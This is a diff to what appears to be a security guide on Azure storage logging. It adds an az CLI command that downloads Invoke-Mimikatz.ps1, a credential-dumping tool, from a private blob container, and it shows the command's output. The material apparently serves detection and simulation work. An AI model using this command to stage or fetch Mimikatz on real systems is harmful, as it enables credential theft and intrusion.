@@ -57,6 +57,32 @@ Finished[#############################################################]  100.000
 }
 ```
 
+**Download Script from Private Container**
+
+AzureCLI
+
+```bash
+az storage blob download --container-name mimifolder --file Invoke-Mimikatz.ps1 --name Invoke-Mimikatz.ps1 --connection-string 'DefaultEndpointsProtocol=https;AccountName=mimiaccountXXXXXXX==;EndpointSuffix=core.windows.net'
+```
+
+```
+Finished[#############################################################]  100.0000%
+{
+  "content": null,
+  "deleted": false,
+  "metadata": {},
+  "name": "Invoke-Mimikatz.ps1",
+  "properties": {
+    "appendBlobCommittedBlockCount": null,
+    "blobTier": null,
+    "blobTierChangeTime": null,
+    "blobTierInferred": false,
+    "blobType": "BlockBlob",
+    "contentLength": 3164893,
+..
+......
+```
+
 ## References:
 
 * https://docs.microsoft.com/en-us/azure/azure-monitor/samples/resource-manager-diagnostic-settings
